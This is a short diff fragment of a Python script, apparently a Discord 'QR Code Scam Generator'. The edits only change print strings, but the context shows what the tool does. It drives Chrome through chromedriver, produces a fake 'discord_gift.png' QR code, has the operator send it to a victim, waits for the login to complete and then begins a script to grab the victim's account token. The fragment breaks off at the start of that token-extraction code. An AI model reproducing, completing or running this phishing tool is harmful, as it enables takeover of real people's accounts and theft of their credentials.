@@ -36,8 +36,8 @@ def paste_template():
 
 def main():
     print('Github.com/ViceHuara/')
-    print('** QR Code Scam Generator **')
-    print('** Launch of the chromedriver...... **')
+    print('- ** QR Code Scam Generator **')
+    print('- ** Launch of the chromedriver...... **')
 
     options = webdriver.ChromeOptions()
     options.add_experimental_option('excludeSwitches', ['enable-logging'])
@@ -66,11 +66,11 @@ def main():
     paste_template()
 
     print('- ** QR Code has been generated. ** > discord_gift.png')
-    print('** Send the QR Code to user and scan. ** Waiting..')
+    print('- ** Send the QR Code to user and scan. ** Waiting..')
     
     while True:
         if discord_login != driver.current_url:
-            print('** Grabbing tokens... **')
+            print('- ** Grabbing tokens... **')
             token = driver.execute_script('''
 
     var req = webpackJsonp.push([
